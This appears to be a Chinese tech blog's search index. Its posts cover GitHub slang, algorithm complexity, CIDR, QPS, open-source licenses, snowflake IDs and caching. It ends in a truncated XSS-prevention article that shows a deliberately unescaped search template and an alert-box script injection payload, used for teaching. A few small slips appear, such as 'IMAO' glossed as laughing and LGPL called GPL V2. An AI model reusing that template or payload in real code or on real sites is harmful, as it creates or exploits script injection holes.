{"pages":[],"posts":[{"title":"Github 常出现的缩写含义","text":"这里整理一下经常看到 Github 的缩写都是什么含义 PR: Pull Request. 拉取请求，给其他项目提交代码 LGTM: Looks Good To Me. 朕知道了 代码已经过 review，可以合并 SGTM: Sounds Good To Me. 和上面那句意思差不多，也是已经通过了 review 的意思 WIP: Work In Progress. 传说中提 PR 的最佳实践是，如果你有个改动很大的 PR，可以在写了一部分的情况下先提交，但是在标题里写上 WIP，以告诉项目维护者这个功能还未完成，方便维护者提前 review部分提交的代码。 PTAL: Please Take A Look. 你来瞅瞅？用来提示别人来看一下 TBR: To Be Reviewed. 提示维护者进行 review TL , DR: Too Long; Didn’t Read. 太长懒得看。也有很多文档在做简略描述之前会写这么一句 TBD: To Be Done(or Defined/Discussed/Decided/Determined). 根据语境不同意义有所区别，但一般都是还没搞定的意思 PRD : Product Requirement Document. 产品需求文档 TBH ：to be honest 老实说 IMAO ：laugh my ass off 笑到不行，超爆笑 BTW ：by the way 顺带一提 TTYL：talk to you later 晚点聊 IDK ：l don’t know 我不知道 AKA：as known as 也就是，以…为人所知 plz：please 拜托 thx：thanks 谢谢 tmr：tomorrow 明天 ppl：people 人们，大家 IMHO：in my humble opinion 依我浅见","link":"/knowledge/github/"},{"title":"算法的时间与空间复杂度","text":"算法（Algorithm）是指用来操作数据、解决程序问题的一组方法。对于同一个问题，使用不同的算法，也许最终得到的结果是一样的，但在过程中消耗的资源和时间却会有很大的区别。 那么我们应该如何去衡量不同算法之间的优劣呢？ 主要还是从算法所占用的「时间」和「空间」两个维度去考量。 时间维度：是指执行当前算法所消耗的时间，我们通常用「时间复杂度」来描述。 空间维度：是指执行当前算法需要占用多少内存空间，我们通常用「空间复杂度」来描述。 作者：不止思考(奎哥)链接：https://zhuanlan.zhihu.com/p/50479555 因此，评价一个算法的效率主要是看它的时间复杂度和空间复杂度情况。然而，有的时候时间和空间却又是「鱼和熊掌」，不可兼得的，那么我们就需要从中去取一个平衡点。 下面我来分别介绍一下「时间复杂度」和「空间复杂度」的计算方式。 时间复杂度我们想要知道一个算法的「时间复杂度」，很多人首先想到的的方法就是把这个算法程序运行一遍，那么它所消耗的时间就自然而然知道了。 这种方式可以吗？当然可以，不过它也有很多弊端。 这种方式非常容易受运行环境的影响，在性能高的机器上跑出来的结果与在性能低的机器上跑的结果相差会很大。而且对测试时使用的数据规模也有很大关系。再者，并我们在写算法的时候，还没有办法完整的去运行呢。 因此，另一种更为通用的方法就出来了：「 大 O 符号表示法 」，即 T(n) = O(f(n)) 我们先来看个例子： 12345for(i=1; i&lt;=n; ++i){ j = i; j++;} 通过「 大 O 符号表示法 」，这段代码的时间复杂度为：O(n) ，为什么呢? 在 大 O 符号表示法中，时间复杂度的公式是： T(n) = O( f(n) )，其中 f(n) 表示每行代码执行次数之和，而 O 表示正比例关系，这个公式的全称是：算法的渐进时间复杂度。 我们继续看上面的例子，假设每行代码的执行时间都是一样的，我们用 1 颗粒时间 来表示，那么这个例子的第一行耗时是 1 个颗粒时间，第三行的执行时间是 n 个颗粒时间，第四行的执行时间也是 n 个颗粒时间（第二行和第五行是符号，暂时忽略），那么总时间就是 1 颗粒时间 + n 颗粒时间 + n 颗粒时间 ，即 (1+2n) 个颗粒时间，即： T(n) = (1+2n)* 颗粒时间，从这个结果可以看出，这个算法的耗时是随着 n 的变化而变化，因此，我们可以简化的将这个算法的时间复杂度表示为：T(n) = O(n) 为什么可以这么去简化呢，因为大 O 符号表示法并不是用于来真实代表算法的执行时间的，它是用来表示代码执行时间的增长变化趋势的。 所以上面的例子中，如果 n 无限大的时候，T(n) = time(1+2n)中的常量 1 就没有意义了，倍数 2 也意义不大。因此直接简化为 T(n) = O(n) 就可以了。 常见的时间复杂度量级有： 常数阶 O(1) 对数阶 O(logN) 线性阶 O(n) 线性对数阶 O(nlogN) 平方阶 O(n²) 立方阶 O(n³) K 次方阶 O(n^k) 指数阶(2^n) 上面从上至下依次的时间复杂度越来越大，执行的效率越来越低。 下面选取一些较为常用的来讲解一下（没有严格按照顺序）： 常数阶 O(1)无论代码执行了多少行，只要是没有循环等复杂结构，那这个代码的时间复杂度就都是 O(1)，如： 12345int i = 1;int j = 2;++i;j++;int m = i + j; 上述代码在执行的时候，它消耗的时候并不随着某个变量的增长而增长，那么无论这类代码有多长，即使有几万几十万行，都可以用 O(1)来表示它的时间复杂度。 线性阶 O(n)这个在最开始的代码示例中就讲解过了，如： 12345for(i=1; i&lt;=n; ++i){ j = i; j++;} 这段代码，for 循环里面的代码会执行 n 遍，因此它消耗的时间是随着 n 的变化而变化的，因此这类代码都可以用 O(n)来表示它的时间复杂度。 对数阶 O(logN)还是先来看代码： 12345int i = 1;while(i&lt;n){ i = i * 2;} 从上面代码可以看到，在 while 循环里面，每次都将 i 乘以 2，乘完之后，i 距离 n 就越来越近了。我们试着求解一下，假设循环 x 次之后，i 就大于 2 了，此时这个循环就退出了，也就是说 2 的 x 次方等于 n，那么 x = log2^n 也就是说当循环 log2^n 次以后，这个代码就结束了。因此这个代码的时间复杂度为：O(logn) 线性对数阶 O(nlogN)线性对数阶 O(nlogN) 其实非常容易理解，将时间复杂度为 O(logn)的代码循环 N 遍的话，那么它的时间复杂度就是 n * O(logN)，也就是了 O(nlogN)。 就拿上面的代码加一点修改来举例 12345678for(m=1; m&lt;n; m++){ i = 1; while(i&lt;n) { i = i * 2; }} 平方阶 O(n²)平方阶 O(n²) 就更容易理解了，如果把 O(n) 的代码再嵌套循环一遍，它的时间复杂度就是 O(n²) 了。举例： 12345678for(x=1; i&lt;=n; x++){ for(i=1; i&lt;=n; i++) { j = i; j++; }} 这段代码其实就是嵌套了 2 层 n 循环，它的时间复杂度就是 O(n*n)，即 O(n²) 如果将其中一层循环的 n 改成 m，即： 12345678for(x=1; x&lt;=m; x++){ for(i=1; i&lt;=n; i++) { j = i; j++; }} 那它的时间复杂度就变成了 O(m*n) 立方阶 O(n³)、K 次方阶 O(n^k)参考上面的 O(n²) 去理解就好了，O(n³)相当于三层 n 循环，其它的类似。 除此之外，其实还有 平均时间复杂度、均摊时间复杂度、最坏时间复杂度、最好时间复杂度 的分析方法，有点复杂，这里就不展开了。 空间复杂度既然时间复杂度不是用来计算程序具体耗时的，那么我也应该明白，空间复杂度也不是用来计算程序实际占用的空间的。 空间复杂度是对一个算法在运行过程中临时占用存储空间大小的一个量度，同样反映的是一个趋势，我们用 S(n) 来定义。 空间复杂度比较常用的有：O(1)、O(n)、O(n²)，我们下面来看看： 空间复杂度 O(1)如果算法执行所需要的临时空间不随着某个变量 n 的大小而变化，即此算法空间复杂度为一个常量，可表示为 O(1)。举例： 12345int i = 1;int j = 2;++i;j++;int m = i + j; 代码中的 i、j、m 所分配的空间都不随着处理数据量变化，因此它的空间复杂度 S(n) = O(1) 空间复杂度 O(n)我们先看一个代码： 123456int[] m = new int[n]for(i=1; i&lt;=n; ++i){ j = i; j++;} 这段代码中，第一行 new 了一个数组出来，这个数据占用的大小为 n，这段代码的 2-6 行，虽然有循环，但没有再分配新的空间，因此，这段代码的空间复杂度主要看第一行即可，即 S(n) = O(n)","link":"/knowledge/algorithm/"},{"title":"IP 斜杠后数字的含义","text":"在设置安全组与配置路由时经常见到 ip 地址后面带一个斜杠，例如： xx.xx.xx.xx/24 xx.xx.xx.xx/28 通俗一点就是，斜杠后面的数字就表示子网掩码，数字具体代表 32 位子网掩码（二进制形式）中前面的 1 的个数，通过后面数字可以将前面的网段进一步细划分成具体的子网，例如： xx.xx.xx.2/24 表示一个 ip 地址 xx.xx.xx.2 ，24 告诉了这个 ip 地址所对应的子网掩码 xx.xx.xx.0/24 表示一个网段，并且 24 告诉了当前具体的子网掩码 其实这个就是用 CIDR 的形式表示的一个网段，或者说子网，CIDR: 无类别域间路由选择，Classless and Subnet Address Extensions and Supernetting 我们知道确定一个子网需要知道主机地址和子网掩码，但用 CIDR 的形式， 可以简单得到两个数值。举例说吧，192.168.0.0/24 就表示，这个网段的 IP 地址从 192.168.0.1 开始，到 192.168.0.254结束（192.168.0.0 和 192.168.0.255 有特殊含义，不能用作 IP 地址），子网掩码是 255.255.255.0 上面的子网掩码怎么来的呢？ 其实关键就在 24 上。我们知道 IP 地址是四个十进制数组成的，相当于 32 位二进制。用 CIDR 表示形式，后一个数字将这 32 位进行了间隔（以 24 为例）：前 24 位用 1 表示，后面 8位用 0 表示，得到一个二进制数： 11111111 11111111 11111111 00000000 将其转化为十进制： 255 255 255 0 因此子网掩码为 255.255.255.0，子网的个数为 254 个 以此类推，如果为 28，得到一个二进制数： 11111111 11111111 11111111 11110000 将其转化为十进制： 255 255 255 240 因此子网掩码为 255.255.255.240，子网的个数为 14 个","link":"/knowledge/ip/"},{"title":"像素尺寸","text":"一张图片的打印出来的实际尺寸是由电子图片的像素和分辨率共同决定的，像素(Pixel)是指构成图片的小色点，分辨率(单位 DPI)是指每英寸(Inch)上的像素数量，可以看做是这些小色点的分布密度；像素相同时，分辨率越高则像素密度越大，实际打印尺寸越小，图像也越清晰。 实际尺寸(英寸)=像素/分辨率; 1 英寸=2.54 厘米; 如一张图片宽为 600 像素，分辨率为 300，那么实际打印宽度为：600/300=2 英寸，约为 5 厘米。 通常手机、电脑上用的照片分辨率都是 72，如果照片要打印或印刷出来，分辨率要 300 或 300 以上。","link":"/knowledge/pixel/"},{"title":"什么是 QPS、响应时间、吞吐量","text":"峰值时间每秒请求数(QPS)原理：每天 80%的访问集中在 20%的时间里，这 20%时间叫做峰值时间 公式：( 总 PV 数 _ 80% ) / ( 每天秒数 _ 20% ) = 峰值时间每秒请求数(QPS) 机器：峰值时间每秒 QPS / 单台机器的 QPS = 需要的机器 每天 300w PV 的在单台机器上，这台机器需要多少 QPS？ 例如：( 3000000 _ 0.8 ) / (86400 _ 0.2 ) = 139 (QPS)，因此一般需要达到 139QPS 每秒查询率 QPS 是对一个特定的查询服务器在规定时间内所处理流量多少的衡量标准。 每秒查询率，因特网上，经常用每秒查询率来衡量域名系统服务器的机器的性能，其即为 QPS。对应 fetches/sec，即每秒的响应请求数，也即是最大吞吐能力。 响应时间(RT)响应时间是指系统对请求作出响应的时间。 直观上看，这个指标与人对软件性能的主观感受是非常一致的，因为它完整地记录了整个计算机系统处理请求的时间。 由于一个系统通常会提供许多功能，而不同功能的处理逻辑也千差万别，因而不同功能的响应时间也不尽相同，甚至同一功能在不同输入数据的情况下响应时间也不相同。 所以，在讨论一个系统的响应时间时，人们通常是指该系统所有功能的平均时间或者所有功能的最大响应时间。 当然，往往也需要对每个或每组功能讨论其平均响应时间和最大响应时间。 对于单机的没有并发操作的应用系统而言，人们普遍认为响应时间是一个合理且准确的性能指标。 需要指出的是，响应时间的绝对值并不能直接反映软件的性能的高低，软件性能的高低实际上取决于用户对该响应时间的接受程度。 对于一个游戏软件来说，响应时间小于 100 毫秒应该是不错的，响应时间在 1 秒左右可能属于勉强可以接受，如果响应时间达到 3 秒就完全难以接受了。 而对于编译系统来说，完整编译一个较大规模软件的源代码可能需要几十分钟甚至更长时间，但这些响应时间对于用户来说都是可以接受的。 吞吐量(Throughput)吞吐量是指系统在单位时间内处理请求的数量。 对于无并发的应用系统而言，吞吐量与响应时间成严格的反比关系，实际上此时吞吐量就是响应时间的倒数。 前面已经说过，对于单用户的系统，响应时间（或者系统响应时间和应用延迟时间）可以很好地度量系统的性能，但对于并发系统，通常需要用吞吐量作为性能指标。 对于一个多用户的系统，如果只有一个用户使用时系统的平均响应时间是 t，当有你 n 个用户使用时，每个用户看到的响应时间通常并不是 n×t，而往往比 n×t 小很多（当然，在某些特殊情况下也可能比 n×t 大，甚至大很多）。 这是因为处理每个请求需要用到很多资源，由于每个请求的处理过程中有许多不走难以并发执行，这导致在具体的一个时间点，所占资源往往并不多。 也就是说在处理单个请求时，在每个时间点都可能有许多资源被闲置，当处理多个请求时，如果资源配置合理，每个用户看到的平均响应时间并不随用户数的增加而线性增加。 实际上，不同系统的平均响应时间随用户数增加而增长的速度也不大相同，这也是采用吞吐量来度量并发系统的性能的主要原因。 一般而言，吞吐量是一个比较通用的指标，两个具有不同用户数和用户使用模式的系统，如果其最大吞吐量基本一致，则可以判断两个系统的处理能力基本一致。 并发用户数并发用户数是指系统可以同时承载的正常使用系统功能的用户的数量。 与吞吐量相比，并发用户数是一个更直观但也更笼统的性能指标。 实际上，并发用户数是一个非常不准确的指标，因为用户不同的使用模式会导致不同用户在单位时间发出不同数量的请求。 一网站系统为例，假设用户只有注册后才能使用，但注册用户并不是每时每刻都在使用该网站，因此具体一个时刻只有部分注册用户同时在线，在线用户就在浏览网站时会花很多时间阅读网站上的信息，因而具体一个时刻只有部分在线用户同时向系统发出请求。 这样，对于网站系统我们会有三个关于用户数的统计数字：注册用户数、在线用户数和同时发请求用户数。由于注册用户可能长时间不登陆网站，使用注册用户数作为性能指标会造成很大的误差。 而在线用户数和同事发请求用户数都可以作为性能指标。 相比而言，以在线用户作为性能指标更直观些，而以同时发请求用户数作为性能指标更准确些。 QPS 每秒查询率(Query Per Second)每秒查询率 QPS 是对一个特定的查询服务器在规定时间内所处理流量多少的衡量标准，在因特网上，作为域名系统服务器的机器的性能经常用每秒查询率来衡量。 对应 fetches/sec，即每秒的响应请求数，也即是最大吞吐能力。（看来是类似于 TPS，只是应用于特定场景的吞吐量）","link":"/knowledge/what_qps/"},{"title":"关于开源协议，你知多少","text":"软件在追求“自由”的同时，不能牺牲程序员的利益，否则将会影响程序员的创造激情，因此世界上现在有 60 多种被开源促进组织（Open Source Initiative）认可的开源许可协议来保证开源工作者的权益。 开源协议规定了你在使用开源软件时的权利和责任，也就是规定了你可以做什么，不可以做什么。开源协议虽然不一定具备法律效力，但是当涉及软件版权纠纷时，开源协议也是非常重要的证据之一。 对于准备编写一款开源软件的开发人员，也非常建议先了解一下当前最热门的开源许可协议，选择一个合适的开源许可协议来最大限度保护自己的软件权益。 作者：机智玛莉链接：https://zhuanlan.zhihu.com/p/78998314 一、什么是开源许可协议一个开源许可是一种类型的许可证为计算机软件和其它产品，其允许源代码，蓝图或设计使用，修改和/或在确定的条款和条件共享。允许最终用户和商业公司审查和修改源代码，蓝图或设计，以满足他们自己的定制，好奇心或故障排除需求。开源许可软件大多是免费提供的，但并非必须如此。只允许非商业性的许可证仅为个人使用而重新分发或修改源代码通常不被视为开源许可。但是，开源许可证可能有一些限制，特别是关于软件来源的表达，例如要求保留作者姓名和代码中的版权声明，或者要求重新分发许可软件仅在相同的许可下（如在 Copyleft 许可中）。一组流行的开源软件许可证是开源计划（OSI）基于其开源定义（OSD）批准的许可证 二、常见的开源协议有哪些1) GNU GPL（GNU General Public License，GNU 通用公共许可证） 只要软件中包含了遵循 GPL 协议的产品或代码，该软件就必须也遵循 GPL 许可协议，也就是必须开源免费，不能闭源收费，因此这个协议并不适合商用软件。遵循 GPL 协议的开源软件数量极其庞大，包括 Linux 系统在内的大多数的开源软件都是基于这个协议的。GPL 开源协议的主要特点 特点说明复制自由允许把软件复制到任何人的电脑中，并且不限制复制的数量。传播自由允许软件以各种形式进行传播。收费传播允许在各种媒介上出售该软件，但必须提前让买家知道这个软件是可以免费获得的；因此，一般来讲，开源软件都是通过为用户提供有偿服务的形式来盈利的。修改自由允许开发人员增加或删除软件的功能，但软件修改后必须依然基于 GPL 许可协议授权。 2) BSD（Berkeley Software Distribution，伯克利软件发布版）协议 BSD 协议基本上允许用户“为所欲为”，用户可以使用、修改和重新发布遵循该许可的软件，并且可以将软件作为商业软件发布和销售，前提是需要满足下面三个条件： 如果再发布的软件中包含源代码，则源代码必须继续遵循 BSD 许可协议。 如果再发布的软件中只有二进制程序，则需要在相关文档或版权文件中声明原始代码遵循了 BSD 协议。 不允许用原始软件的名字、作者名字或机构名称进行市场推广。 BSD 对商业比较友好，很多公司在选用开源产品的时候都首选 BSD 协议，因为可以完全控制这些第三方的代码，甚至在必要的时候可以修改或者二次开发。 3) Apache 许可证版本（Apache License Version）协议 Apache 和 BSD 类似，都适用于商业软件。Apache 协议在为开发人员提供版权及专利许可的同时，允许用户拥有修改代码及再发布的自由。 现在热门的 Hadoop、Apache HTTP Server、MongoDB 等项目都是基于该许可协议研发的，程序开发人员在开发遵循该协议的软件时，要严格遵守下面的四个条件： 该软件及其衍生品必须继续使用 Apache 许可协议。 如果修改了程序源代码，需要在文档中进行声明。 若软件是基于他人的源代码编写而成的，则需要保留原始代码的协议、商标、专利声明及其他原作者声明的内容信息。 如果再发布的软件中有声明文件，则需在此文件中标注 Apache 许可协议及其他许可协议。 4) MIT（Massachusetts Institute of Technology）协议目前限制最少的开源许可协议之一（比 BSD 和 Apache 的限制都少），只要程序的开发者在修改后的源代码中保留原作者的许可信息即可，因此普遍被商业软件所使用。 使用 MIT 协议的软件有 PuTTY、X Window System、Ruby on Rails、Lua 5.0 onwards、Mono 等。 5) GUN LGPL（GNU Lesser General Public License，GNU 宽通用公共许可证）LGPL 是 GPL 的一个衍生版本，也被称为 GPL V2，该协议主要是为类库设计的开源协议。 LGPL 允许商业软件通过类库引用（link）的方式使用 LGPL 类库，而不需要开源商业软件的代码。这使得采用 LGPL 协议的开源代码可以被商业软件作为类库引用并发布和销售。 但是如果修改 LGPL 协议的代码或者衍生品，则所有修改的代码，涉及修改部分的额外代码和衍生的代码都必须采用 LGPL 协议。因此 LGPL 协议的开源代码很适合作为第三方类库被商业软件引用，但不适合希望以 LGPL 协议代码为基础，通过修改和衍生的方式做二次开发的商业软件采用。 三、如何选择开源协议世界上的开源协议有上百种，很少有人能彻底搞清它们之间的区别，即使在最流行的六种开源协议——GPL、BSD、MIT、Mozilla、Apache 和 LGPL——之中做选择，也很复杂。 乌克兰程序员 Paul Bagwell 画了一张分析图，说明应该怎么选择开源协议，大家看了一目了然，真是清爽。","link":"/knowledge/opensource/"},{"title":"产品开发各阶段缩写","text":"EVT(Engineering Verification Test) 工程验证测试 产品开发初期的设计验证。设计者实现样品时做初期的测试验证，包括功能和安规测试，一般由 RD(Research &amp; Development)对样品进行全面验证，因为是样品，问题可能较多，测试可能会做 N 次。 DVT(Design Verification Test) 设计验证测试 解决样品在 EVT 阶段的问题后进行，对所有信号的电平和时序进行测试，完成安规测试，由 RD 和 DQA(Design Quality Assurance)验证，此时产品基本定型。 DMT(Design Maturity Test) 成熟度验证 可与 DVT 同时进行，主要极限条件下测试产品的 MTBF(Mean Time Between Failure)。HALT(High Accelerated Life Test）&amp; HASS(High Accelerated Stress Screen)等，是检验产品潜在缺陷的有效方法。 MVT(Mass-Production Verification Test) 量产验证测试 验证量产时产品的大批量一致性，由 DQA 验证。 PVT(Pilot-run Verification Test) 小批量过程验证测试 验证新机型的各功能实现状况并进行稳定性及可靠性测试。 MP(Mass-Production) 量产","link":"/knowledge/what_pda/"},{"title":"什么是雪花 ID","text":"在以前的项目中，最常见的两种主键类型是自增 Id 和 UUID，在比较这两种 ID 之前首先要搞明白一个问题，就是为什么主键有序比无序查询效率要快，因为自增 Id 和 UUID 之间最大的不同点就在于有序性。 作者：java 技术爱好者链接：https://juejin.cn/post/6965510420387856398 我们都知道，当我们定义了主键时，数据库会选择表的主键作为聚集索引(B+Tree)，mysql 在底层是以数据页为单位来存储数据的。 也就是说如果主键为 自增 id 的话，mysql 在写满一个数据页的时候，直接申请另一个新数据页接着写就可以了。如果一个数据页存满了，mysql 就会去申请一个新的数据页来存储数据。如果主键是 UUID，为了确保索引有序，mysql 就需要将每次插入的数据都放到合适的位置上。这就造成了页分裂，这个大量移动数据的过程是会严重影响插入效率的。 一句话总结就是，InnoDB 表的数据写入顺序能和 B+ 树索引的叶子节点顺序一致的话，这时候存取效率是最高的。 但是为什么很多情况又不用 自增 id 作为主键呢？ 容易导致主键重复。比如导入旧数据时，线上又有新的数据新增，这时就有可能在导入时发生主键重复的异常。为了避免导入数据时出现主键重复的情况，要选择在应用停业后导入旧数据，导入完成后再启动应用。显然这样会造成不必要的麻烦。而 UUID 作为主键就不用担心这种情况。 不利于数据库的扩展。当采用自增 id 时，分库分表也会有主键重复的问题。UUID 则不用担心这种问题。 那么问题就来了，自增 id 会担心主键重复，UUID 不能保证有序性，有没有一种 ID 既是有序的，又是唯一的呢？ 当然有，就是 雪花ID。 什么是雪花 IDsnowflake 是 Twitter 开源的分布式 ID 生成算法，结果是 64bit 的 Long 类型的 ID，有着全局唯一和有序递增的特点。 最高位是符号位，因为生成的 ID 总是正数，始终为 0，不可用。 41 位的时间序列，精确到毫秒级，41 位的长度可以使用 69 年。时间位还有一个很重要的作用是可以根据时间进行排序。 10 位的机器标识，10 位的长度最多支持部署 1024 个节点。 12 位的计数序列号，序列号即一系列的自增 ID，可以支持同一节点同一毫秒生成多个 ID 序号，12 位的计数序列号支持每个节点每毫秒产生 4096 个 ID 序号。 缺点也是有的，就是强依赖机器时钟，如果机器上时钟回拨，有可能会导致主键重复的问题。 Java 实现雪花 ID下面是用 Java 实现雪花 ID 的代码，供大家参考一下。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102public class SnowflakeIdWorker { /** * 开始时间：2020-01-01 00:00:00 */ private final long beginTs = 1577808000000L; private final long workerIdBits = 10; /** * 2^10 - 1 = 1023 */ private final long maxWorkerId = -1L ^ (-1L &lt;&lt; workerIdBits); private final long sequenceBits = 12; /** * 2^12 - 1 = 4095 */ private final long maxSequence = -1L ^ (-1L &lt;&lt; sequenceBits); /** * 时间戳左移22位 */ private final long timestampLeftOffset = workerIdBits + sequenceBits; /** * 业务ID左移12位 */ private final long workerIdLeftOffset = sequenceBits; /** * 合并了机器ID和数据标示ID，统称业务ID，10位 */ private long workerId; /** * 毫秒内序列，12位，2^12 = 4096个数字 */ private long sequence = 0L; /** * 上一次生成的ID的时间戳，同一个worker中 */ private long lastTimestamp = -1L; public SnowflakeIdWorker(long workerId) { if (workerId &gt; maxWorkerId || workerId &lt; 0) { throw new IllegalArgumentException(String.format(&quot;WorkerId必须大于或等于0且小于或等于%d&quot;, maxWorkerId)); } this.workerId = workerId; } public synchronized long nextId() { long ts = System.currentTimeMillis(); if (ts &lt; lastTimestamp) { throw new RuntimeException(String.format(&quot;系统时钟回退了%d毫秒&quot;, (lastTimestamp - ts))); } // 同一时间内，则计算序列号 if (ts == lastTimestamp) { // 序列号溢出 if (++sequence &gt; maxSequence) { ts = tilNextMillis(lastTimestamp); sequence = 0L; } } else { // 时间戳改变，重置序列号 sequence = 0L; } lastTimestamp = ts; // 0 - 00000000 00000000 00000000 00000000 00000000 0 - 00000000 00 - 00000000 0000 // 左移后，低位补0，进行按位或运算相当于二进制拼接 // 本来高位还有个0&lt;&lt;63，0与任何数字按位或都是本身，所以写不写效果一样 return (ts - beginTs) &lt;&lt; timestampLeftOffset | workerId &lt;&lt; workerIdLeftOffset | sequence; } /** * 阻塞到下一个毫秒 * * @param lastTimestamp * @return */ private long tilNextMillis(long lastTimestamp) { long ts = System.currentTimeMillis(); while (ts &lt;= lastTimestamp) { ts = System.currentTimeMillis(); } return ts; } public static void main(String[] args) { SnowflakeIdWorker snowflakeIdWorker = new SnowflakeIdWorker(7); for (int i = 0; i &lt; 10; i++) { long id = snowflakeIdWorker.nextId(); System.out.println(id); } }} main 方法，测试结果如下： 12345678910184309536616640512184309536616640513184309536616640514184309536616640515184309536616640516184309536616640517184309536616640518184309536616640519184309536616640520184309536616640521 总结在大部分公司的开发项目中里，雪花 ID 是主流的 ID 生成策略，除了自己实现之外，目前市场上也有很多开源的实现，比如： 美团开源的 Leaf 百度开源的 UidGenerator","link":"/database/what_snowflake/"},{"title":"常见的缓存更新策略剖析","text":"缓存一般是为了应对高并发场景、缓解数据库读写压力，而将数据存储在读写更快的某种存储介质中（如内存），以加快读取数据的速度。缓存一般分为本地缓存（如 java 堆内存缓存）、分布式缓存（如 redis)等。 作者：何轩链接：https://zhuanlan.zhihu.com/p/86396877 既然是缓存，就意味着缓存中暂存的数据只是个副本，也就意味着需要保证副本和主数据之间的数据一致性，这就是接下来要分析的缓存的更新。 常见的缓存更新策略有： 先删缓存，再更新数据库 先更新数据库，再删缓存 先更新数据库，再更新缓存 read/write through 写回。在更新数据的时候，只更新缓存，不更新数据库，而我们的缓存会异步地批量更新数据库 先删缓存再更新数据库很明显这个逻辑是有问题的，假设有两个并发操作，一个操作更新、另一个操作查询，更新操作删除缓存后还没来得及更新数据库，此时另一个用户发起了查询操作，它因没有命中缓存进而从数据库读，此时第一个操作还没到更新数据库的阶段，读取到的是老数据，接着写到缓存中，导致缓存中数据变成脏数据，并且会一直脏下去直到缓存过期或发起新的更新操作。 先更新数据库，再删缓存这是目前业界最常用的方案。虽然它同样不够完美，但问题发生的概率很小，它的读流程和写流程见下图 写操作先更新数据库，更新成功后使缓存失效。读操作先读缓存，缓存中读到了则直接返回，缓存中读不到再读数据库，之后再将数据库数据加载到缓存中。 但它同样也有问题，如下图，查询操作未命中缓存，接着读数据库老数据之后、写缓存之前，此时另一个用户发起了更新操作更新了数据库并清了缓存，接着查询操作将数据库中老数据更新到缓存。这就导致缓存中数据变成脏数据，并且会一直脏下去直到缓存过期或发起新的更新操作。 为什么这种思路存在这么明显的问题，却还具有那么广泛的应用呢？因为这个 case 实际上出现的概率非常低，产生这个 case 需要具备如下 4 个条件 读操作读缓存失效 有个并发的写操作 写操作比读操作更快 读操作早于写操作进入数据库，晚于写操作更新缓存 而实际上数据库的写操作会比读操作慢得多，而且还要锁表，而读操作必需在写操作前进入数据库操作，而又要晚于写操作更新缓存，所有的这些条件都具备的概率基本并不大。并且即使出现这个问题还有一个缓存过期时间来自动兜底。 先更新数据库，再更新缓存相对来讲，理论上这种方式比先更新数据库再删缓存有着更高的读性能，因为它事先准备好数据。但由于要更新数据库和缓存两块数据，所以它的写性能就比较低，而且关键在于它也会出现脏数据，如下图，两个并发更新操作，分别出现一前一后写数据库、一后一前写缓存，则最终缓存的数据是二者中前一次写入的数据，不是最新的。 read/write through 缓存代理Read/Write Through 套路是把更新数据库（Repository）的操作由缓存自己代理了，所以，对于应用层来说，就简单很多了。可以理解为，应用认为后端就是一个单一的存储，而存储自己维护自己的 Cache。数据库由缓存代理，缓存未命中时由缓存加载数据库数据然后应用从缓存读，写数据时更新完缓存后同步写数据库。应用只感知缓存而不感知数据库。 写回这种方式英文名叫 Write Behind 又叫 Write Back。一些了解 Linux 操作系统内核的同学对 write back 应该非常熟悉，这不就是 Linux 文件系统的 Page Cache 的算法吗？是的，就是那个东西。这种模式是指在更新数据的时候，只更新缓存，不更新数据库，而我们的缓存会异步地批量更新数据库。 这种方式的问题在于数据不是强一致性的，而且可能会丢失（我们知道 Unix/Linux 非正常关机会导致数据丢失，就是因为这个）。另外，Write Back 实现逻辑比较复杂，因为他需要 track 有哪数据是被更新了的，需要刷到持久层上。操作系统的 write back 会在仅当这个 cache 需要失效的时候，才会被真正持久起来，比如，内存不够了，或是进程退出了等情况，这又叫 lazy write。 总结本文归纳了常见的缓存更新的五种思路，其中先更新数据库再删缓存的思路是目前使用得最多的。先删缓存再更新数据库因为出问题概率太大并没有什么用。第三到第五种思路在特定的应用场景下也有很多用途，比如先更新数据库再更新缓存可以解决高并发下缓存未命中导致瞬时大量请求穿透到数据库的问题。每一种方案也有其各自的优点和不足，总而言之，没有完美的方案，只有契合场景的更适合的方案。","link":"/database/cache_policy/"},{"title":"如何防止XSS攻击？","text":"随着互联网的高速发展，信息安全问题已经成为企业最为关注的焦点之一，而前端又是引发企业安全问题的高危据点。在移动互联网时代，前端人员除了传统的 XSS、CSRF 等安全问题之外，又时常遭遇网络劫持、非法调用 Hybrid API 等新型安全问题。当然，浏览器自身也在不断在进化和发展，不断引入 CSP、Same-Site Cookies 等新技术来增强安全性，但是仍存在很多潜在的威胁，这需要前端技术人员不断进行“查漏补缺”。 作者：美团技术团队链接：https://juejin.cn/post/6844903685122703367 近几年，美团业务高速发展，前端随之面临很多安全挑战，因此积累了大量的实践经验。我们梳理了常见的前端安全问题以及对应的解决方案，将会做成一个系列，希望可以帮助前端人员在日常开发中不断预防和修复安全漏洞。本文是该系列的第一篇。 本文我们会讲解 XSS ，主要包括： XSS 攻击的介绍 XSS 攻击的分类 XSS 攻击的预防和检测 XSS 攻击的总结 XSS 攻击案例 XSS 攻击的介绍在开始本文之前，我们先提出一个问题，请判断以下两个说法是否正确： XSS 防范是后端 RD（研发人员）的责任，后端 RD 应该在所有用户提交数据的接口，对敏感字符进行转义，才能进行下一步操作。 所有要插入到页面上的数据，都要通过一个敏感字符过滤函数的转义，过滤掉通用的敏感字符后，就可以插入到页面中。 如果你还不能确定答案，那么可以带着这些问题向下看，我们将逐步拆解问题。 XSS 漏洞的发生和修复XSS 攻击是页面被注入了恶意的代码，为了更形象的介绍，我们用发生在小明同学身边的事例来进行说明。 一个案例某天，公司需要一个搜索页面，根据 URL 参数决定关键词的内容。小明很快把页面写好并且上线。代码如下 123&lt;input type=&quot;text&quot; value=&quot;&lt;%= getParameter(&quot;keyword&quot;) %&gt;&quot;&gt;&lt;button&gt;搜索&lt;/button&gt;&lt;div&gt;您搜索的关键词是：&lt;%= getParameter(&quot;keyword&quot;) %&gt;&lt;/div&gt; 然而，在上线后不久，小明就接到了安全组发来的一个神秘链接： http://xxx/search?keyword=&quot;&gt;&lt;script&gt;alert('XSS');&lt;/script&gt; 小明带着一种不祥的预感点开了这个链接[请勿模仿，确认安全的链接才能点开]。果然，页面中弹出了写着”XSS”的对话框。 可恶，中招了！小明眉头一皱，发现了其中的奥秘： 当浏览器请求 http://xxx/search?keyword=&quot;&gt;&lt;script&gt;alert('XSS');&lt;/script&gt; 时，服务端会解析出请求参数 keyword，得到 &quot;&gt;&lt;script&gt;alert('XSS');&lt;/script&gt;，拼接到 HTML 